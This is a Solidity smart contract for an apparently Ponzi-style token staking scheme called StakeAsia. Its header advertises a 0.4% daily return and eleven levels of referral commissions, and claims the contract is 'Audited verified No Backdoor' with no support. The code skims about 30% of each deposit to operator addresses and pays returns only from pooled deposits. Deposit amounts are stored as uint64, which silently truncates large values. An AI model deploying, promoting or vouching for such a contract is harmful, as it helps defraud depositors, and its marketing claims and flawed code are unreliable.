/*  StakeASIA is the perfect combination of Digital Technology, High Security and Community Program
 *   Safe and decentralized. The Smart Contract source is verified and available to everyone.
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://stakebnb.org    								 │
 * 	 │                                                                       │
 *	 │	 0.4% Daily ROI 						       	 │
 *	 │                                                                       │
 *   │   Audited verified No Backdoor.       								 │
 *   │                                                                 		 │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect Smart Chain browser extension Metamask, or mobile wallet apps like Trust Wallet / Klever
 *   2) Ask your sponsor for Referral link and contribute to the contract.
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 11-level referral commission: 10% - 2% - 1% - 0.5% - 0.4% - 0.3% - 0.2% - 0.1% - 0.1% - 0.1% - 0.1% 
 *   
 */

//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
contract StakeAsia {
    using SafeERC20 for IERC20;
    using SafeMath for uint;
    uint constant public DEPOSITS_MAX = 300;
    uint constant public INVEST_MIN_AMOUNT = 20 ether;
    uint constant public INVEST_MAX_AMOUNT = 4000000 ether;
    uint constant public BASE_PERCENT = 40;
    uint[] public REFERRAL_PERCENTS = [1000, 200, 100, 50, 40, 30, 20, 10, 10, 10, 10];
    uint constant public MARKETING_FEE = 1000; 
    uint constant public PROJECT_FEE = 500;
    uint constant public ADMIN_FEE = 500;
	uint constant public NETWORK = 500;
    uint constant public MAX_CONTRACT_PERCENT = 100;
    uint constant public MAX_LEADER_PERCENT = 20;
    uint constant public MAX_HOLD_PERCENT = 10;
    uint constant public MAX_COMMUNITY_PERCENT = 50;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 100000000 ether;
    uint constant public LEADER_BONUS_STEP = 100000000  ether;
    uint constant public COMMUNITY_BONUS_STEP = 10000000;
    uint constant public TIME_STEP = 1 days;
    uint public totalInvested;
    address public marketingAddress;
    address public projectAddress;
    address public adminAddress;
	address public networkAddress;
    uint public totalDeposits;
    uint public totalWithdrawn;
    uint public contractPercent;
    uint public contractCreationTime;
    uint public totalRefBonus;

    address public contractAddress;
    
    struct Deposit {
        uint64 amount;
        uint64 withdrawn;
        // uint64 refback;
        uint32 start;
    }
    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
        uint24[11] refs;
        // uint16 rbackPercent;
    }
    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;
    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address marketingAddr, address projectAddr, address adminAddr, address networkAddr,address _contractAddress) {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        adminAddress = adminAddr;
		networkAddress = networkAddr;
        contractCreationTime = block.timestamp;
        contractAddress = _contractAddress;
        contractPercent = getContractBalanceRate();
        
    }

    // function setRefback(uint16 rbackPercent) public {
    //     require(rbackPercent <= 10000);

    //     User storage user = users[msg.sender];

    //     if (user.deposits.length > 0) {
    //         user.rbackPercent = rbackPercent;
    //     }
    // }

    function getContractBalance() public view returns (uint) {
        return IERC20(contractAddress).balanceOf(address(this));
    }

    function getContractBalanceRate() public view returns (uint) {
        uint contractBalance = IERC20(contractAddress).balanceOf(address(this));
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    
    function getLeaderBonusRate() public view returns (uint) {
        uint leaderBonusPercent = totalRefBonus.div(LEADER_BONUS_STEP).mul(10);

        if (leaderBonusPercent < MAX_LEADER_PERCENT) {
            return leaderBonusPercent;
        } else {
            return MAX_LEADER_PERCENT;
        }
    }
    
    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = totalDeposits.div(COMMUNITY_BONUS_STEP).mul(10);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }
    
    function withdraw() public {
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);
		uint communityBonus = getCommunityBonusRate();
		uint leaderbonus = getLeaderBonusRate();

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance =  IERC20(contractAddress).balanceOf(address(this));
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
        // if (msgValue > availableLimit) {
        //     msg.sender.transfer(msgValue.sub(availableLimit));
        //     msgValue = availableLimit;
        // }

        // uint halfDayTurnover = turnover[getCurrentHalfDay()];
        // uint halfDayLimit = getCurrentDayLimit();

        // if (INVEST_MIN_AMOUNT.add(msgValue).add(halfDayTurnover) < halfDayLimit) {
        //     turnover[getCurrentHalfDay()] = halfDayTurnover.add(msgValue);
        // } else {
        //     turnover[getCurrentHalfDay()] = halfDayLimit;
        // }

        user.checkpoint = uint32(block.timestamp);

        IERC20(contractAddress).safeTransfer(msg.sender,totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);


        emit Withdrawn(msg.sender, totalAmount);
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            // return contractPercent.add(timeMultiplier);
            return contractPercent;
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);
		uint communityBonus = getCommunityBonusRate();
		uint leaderbonus = getLeaderBonusRate();

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }
    
    function invest(uint256 _amount,address referrer) public {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(_amount >= INVEST_MIN_AMOUNT && _amount <= INVEST_MAX_AMOUNT, "Bad Deposit");

        IERC20(contractAddress).safeTransferFrom(msg.sender,address(this),_amount);

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 300 deposits from address");

        // uint availableLimit = getCurrentHalfDayAvailable();
        // require(availableLimit > 0, "Deposit limit exceed");

        uint msgValue = _amount;

        // if (msgValue > availableLimit) {
        //     msg.sender.transfer(msgValue.sub(availableLimit));
        //     msgValue = availableLimit;
        // }

        // uint halfDayTurnover = turnover[getCurrentHalfDay()];
        // uint halfDayLimit = getCurrentDayLimit();

        // if (INVEST_MIN_AMOUNT.add(msgValue).add(halfDayTurnover) < halfDayLimit) {
        //     turnover[getCurrentHalfDay()] = halfDayTurnover.add(msgValue);
        // } else {
        //     turnover[getCurrentHalfDay()] = halfDayLimit;
        // }

        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		uint adminFee = msgValue.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);
		uint network = msgValue.mul(NETWORK).div(PERCENTS_DIVIDER);

        IERC20(contractAddress).safeTransfer(marketingAddress,marketingFee);
        IERC20(contractAddress).safeTransfer(projectAddress,projectFee);
        IERC20(contractAddress).safeTransfer(adminAddress,adminFee);
        IERC20(contractAddress).safeTransfer(networkAddress,network);

        emit FeePayed(msg.sender, marketingFee.add(projectFee).add(network));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
        // else{
        //     user.referrer = adminAddress;
        // }
        
        // uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint i = 0; i < 11; i++) {
                if (upline != address(0)) {
                    uint amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    // }

                    if (amount > 0) {
                        IERC20(contractAddress).safeTransfer(address(uint160(upline)),amount);
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                        
                        totalRefBonus = totalRefBonus.add(amount);
                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msgValue);
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }
    
    function getUserLastDeposit(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getCurrentHalfDay() public view returns (uint) {
        return (block.timestamp.sub(contractCreationTime)).div(TIME_STEP.div(2));
    }

    // function getCurrentDayLimit() public view returns (uint) {
    //     uint limit;

    //     uint currentDay = (block.timestamp.sub(contractCreation)).div(TIME_STEP);

    //     if (currentDay == 0) {
    //         limit = DAY_LIMIT_STEPS[0];
    //     } else if (currentDay == 1) {
    //         limit = DAY_LIMIT_STEPS[1];
    //     } else if (currentDay >= 2 && currentDay <= 5) {
    //         limit = DAY_LIMIT_STEPS[1].mul(currentDay);
    //     } else if (currentDay >= 6 && currentDay <= 19) {
    //         limit = DAY_LIMIT_STEPS[2].mul(currentDay.sub(3));
    //     } else if (currentDay >= 20 && currentDay <= 49) {
    //         limit = DAY_LIMIT_STEPS[3].mul(currentDay.sub(11));
    //     } else if (currentDay >= 50) {
    //         limit = DAY_LIMIT_STEPS[4].mul(currentDay.sub(30));
    //     }

    //     return limit;
    // }

    function getCurrentHalfDayTurnover() public view returns (uint) {
        return turnover[getCurrentHalfDay()];
    }

    // function getCurrentHalfDayAvailable() public view returns (uint) {
    //     return getCurrentDayLimit().sub(getCurrentHalfDayTurnover());
    // }

    function getUserDeposits(address userAddress, uint last, uint first) public view returns (uint[] memory, uint[] memory, uint[] memory, uint[] memory) {
        User storage user = users[userAddress];

        uint count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint[] memory amount = new uint[](count);
        uint[] memory withdrawn = new uint[](count);
        uint[] memory refback = new uint[](count);
        uint[] memory start = new uint[](count);

        uint index = 0;
        for (uint i = first; i > last; i--) {
            amount[index] = uint(user.deposits[i-1].amount);
            withdrawn[index] = uint(user.deposits[i-1].withdrawn);
            // refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint, uint, uint, uint) {
        return (totalInvested, totalDeposits, IERC20(contractAddress).balanceOf(address(this)), contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint, uint, uint, uint, uint) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint24[11] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}